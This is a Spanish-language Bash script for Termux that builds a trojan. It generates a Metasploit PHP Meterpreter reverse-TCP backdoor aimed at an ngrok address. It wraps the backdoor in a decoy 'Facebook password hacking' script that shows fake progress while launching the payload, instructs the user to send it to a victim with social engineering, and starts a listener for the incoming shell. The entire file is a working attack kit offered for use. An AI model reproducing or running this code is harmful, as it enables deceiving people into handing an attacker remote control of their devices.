#! /bin/bash


white="\033[1;37m"
grey="\033[0;37m"
purple="\033[0;35m"
red="\033[1;31m"                                                              
green="\033[1;32m"
yellow="\033[1;33m"
Purple="\033[0;35m"
Cyan="\033[0;36m"
Cafe="\033[0;33m"
Fiuscha="\033[0;35m"
blue="\033[1;34m"
nc="\e[0m"

#directory verification
directory=$(pwd)


if which figlet >/dev/null; then
sleep 1
echo ""
echo -e "$blue(figlet)$nc ................................................... Instalado [$green✓$nc]"
else
sleep 1
echo -e "$red(figlet)$nc No instalado [$red✗$nc]"
sleep 1
echo -e "\e[1;32mInstalando figlet ...\e[0m"
sleep 3
pkg install figlet
fi

clear
echo -e "\e[1;32m___________________________________________________\e[0m"
echo -e "\e[1;32m|                                                 |\e[0m"
echo -e     "\e[1;32m|\e[0m\e[1;31m     ╲ ▁▂▂▂▁ ╱                                   \e[0m\e[1;32m|\e[0m"
echo -e    "\e[1;32m|\e[0m\e[1;31m     ▄███████▄      ------------------------     \e[0m\e[1;32m|\e[0m"
echo -e   "\e[1;32m|\e[0m\e[1;31m    ▄██ ███ ██▄     |Crea tu propio troyano|     \e[0m\e[1;32m|\e[0m"
echo -e "\e[1;32m|\e[0m\e[1;31m   ▄███████████▄    |dentro de una script  |     \e[0m\e[1;32m|\e[0m"
echo -e "\e[1;32m|\e[0m\e[1;31m                    ------------------------     \e[0m\e[1;32m|\e[0m"
echo -e "\e[1;32m|_________________________________________________|\e[0m"
echo ""
echo -e "\e[1;37;41mUSO:\e[0m \e[1;32mEsta herramienta crea una script infectada\e[0m"
echo ""
echo -e "            \e[1;31;42mScript Facebook Infect\e[0m"
sleep 1
echo ""
echo -e "            \e[1;32m- - -\e[0m \e[1;31m[\e[0m\e[1;37mMSFVENOM\e[0m\e[1;31m]\e[0m \e[1;32m- - -\e[0m"
echo ""
setterm -foreground blue
#Contestar las preguntas
echo -n "[+]IP ngrok > "
read a
echo ""
echo -n "[+]Port ngrok > "
read b
echo ""
echo -n "[+]Port > "
read c
echo ""
setterm -foreground green
echo " [+]Generando Backdoor ..."
echo ""
setterm -foreground green
#Ejecutar msfvenom
msfvenom -p php/meterpreter/reverse_tcp lhost=$a lport=$b r > index.php

echo "
#! /bin/bash

blue='\033[1;34m'
nc='\e[0m'
green='\033[1;32m'

DIRECTORIO=/data/data/com.termux/files/home/storage

if [ -d '$DIRECTORIO' ]
then
   echo -e 'Directorio $blue(${DIRECTORIO}) $nc... $green existe'
else
   echo 'Directorio $blue(${DIRECTORIO}) $nc... $green no existe'
termux-setup-storage
fi

white='\033[1;37m'
grey='\033[0;37m'
purple='\033[0;35m'
red='\033[1;31m'
green='\033[1;32m'
yellow='\033[1;33m'
Purple='\033[0;35m'
Cyan='\033[0;36m'
Cafe='\033[0;33m'
Fiuscha='\033[0;35m'
blue='\033[1;34m'
nc='\e[0m'


#directory verification
directory=$(pwd)


if which figlet >/dev/null; then
sleep 1
echo ''
echo -e '$blue(figlet)$nc ................................................... Instalado [$green✓$nc]'
else
sleep 1
echo -e '$red(figlet)$nc No instalado [$red✗$nc]'
sleep 1
echo -e '\e[1;32mInstalando figlet ...\e[0m'
sleep 3
pkg install figlet
fi

#directory verification
directory=$(pwd)


if which php >/dev/null; then
sleep 1
echo ''
echo -e '$blue(php)$nc ................................................... Instalado [$green✓$nc]'
else
sleep 1
echo -e '$red(php)$nc No instalado [$red✗$nc]'
sleep 1
echo -e '\e[1;32mInstalando php ...\e[0m'
sleep 3
pkg install php
fi
                                                                                                                                                                               
clear
setterm -foreground blue
figlet Facebook
echo ''
setterm -foreground yellow
echo -n '[+] Escribe la ID de la victima >> '
read id
sleep 1
echo ''
setterm -foreground white
echo ''
echo -e '\e[1;32m1% Hackeando la contraseña de\e[0m \e[1;33m-->\e[0m \e[1;31m[\e[0m Facebook \e[1;31m]\e[0m'
sleep 1
echo ''
echo -e '\e[1;32m2% Hackeando la contraseña de\e[0m \e[1;33m-->\e[0m \e[1;31m[\e[0m Facebook \e[1;31m]\e[0m'
sleep 1
echo ''
echo -e '\e[1;32m3% Hackeando la contraseña de\e[0m \e[1;33m-->\e[0m \e[1;31m[\e[0m Facebook \e[1;31m]\e[0m'
sleep 1
echo ''
echo -e '\e[1;32m4% Hackeando la contraseña de\e[0m \e[1;33m-->\e[0m \e[1;31m[\e[0m Facebook \e[1;31m]\e[0m'
sleep 1
echo ''
echo -e '\e[1;32m5% Hackeando la contraseña de\e[0m \e[1;33m-->\e[0m \e[1;31m[\e[0m Facebook \e[1;31m]\e[0m'
sleep 1
echo ''
echo -e '\e[1;32m6% Hackeando la contraseña de\e[0m \e[1;33m-->\e[0m \e[1;31m[\e[0m Facebook \e[1;31m]\e[0m'
sleep 1
echo ''
echo -e '\e[1;32m7% Hackeando la contraseña de\e[0m \e[1;33m-->\e[0m \e[1;31m[\e[0m Facebook \e[1;31m]\e[0m'
sleep 1
echo ''
echo -e '\e[1;32m8% Hackeando la contraseña de\e[0m \e[1;33m-->\e[0m \e[1;31m[\e[0m Facebook \e[1;31m]\e[0m'
sleep 1
echo ''
echo -e '\e[1;32m9% Hackeando la contraseña de\e[0m \e[1;33m-->\e[0m \e[1;31m[\e[0m Facebook \e[1;31m]\e[0m'
sleep 1
echo ''
echo -e '\e[1;32m10% Hackeando la contraseña de\e[0m \e[1;33m-->\e[0m \e[1;31m[\e[0m Facebook \e[1;31m]\e[0m'
sleep 1
echo ''
echo -e '\e[1;37mSe ha encontrado una contraseña\e[0m \e[1;34m(\e[0m\e[1;35m*********\e[0m\e[1;34m)\e[0m'
echo ''
sleep 3
setterm -foreground yellow
echo '[+]Desifrando contraseña ...'
sleep 6
echo ''
setterm -foreground cyan
php -f index.php & bash meta.sh
" > facebook.sh

rm -r /sdcard/'Script Facebook Infect'
mkdir /sdcard/'Script Facebook Infect'
mv facebook.sh index.php /sdcard/'Script Facebook Infect'
cp meta.sh /sdcard/'Script Facebook Infect'

echo ""
setterm -foreground cyan
echo "💀Se creo la carpeta Script Facebook Infect en su sdcard adentro estan los tres archivos"
echo "💀Enviar a la victima despues de ejecutar el 0.0.0.0:"
echo "💀Recuerda usar Ingeniera Social"
echo -e "\e[1;37;41mContactame: https://m.facebook.com/Jimber.Cevallos\e[0m"

echo ""
setterm -foreground blue
echo "////Ejecutando metasploit framework \\\\"
echo ""
#Ejecutar msfconsole
msfconsole -q -x "use exploit/multi/handler;set payload php/meterpreter/reverse_tcp;set lhost 0.0.0.0;set lport $c;exploit"

